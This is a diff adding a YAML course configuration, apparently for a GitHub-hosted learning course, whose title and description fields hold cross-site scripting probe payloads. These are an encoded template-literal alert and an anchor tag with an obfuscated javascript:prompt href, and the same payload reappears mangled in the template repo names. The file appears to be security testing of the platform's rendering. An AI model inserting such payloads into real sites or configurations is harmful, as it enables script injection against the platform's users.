@@ -1,0 +1,18 @@
+title: '%60%2balert/**/(1)%2b%60'
+description: >-
+  4"><a fooooooooooooooooooooooooooooooooo
+  href=JaVAScript%26colon%3Bprompt%26lpar%3B1%26rpar%3B%>
+template:
+  repo: 602balert**(1)2b60-template
+  name: 602balert**(1)2b60
+before:
+  - type: createIssue
+    title: Welcome!
+    body: new-issue.md
+steps:
+  - title: First step
+    description: The first step in your course
+    event: issues.assigned
+    link: '{{ repoUrl }}'
+    actions:
+      - type: closeIssue
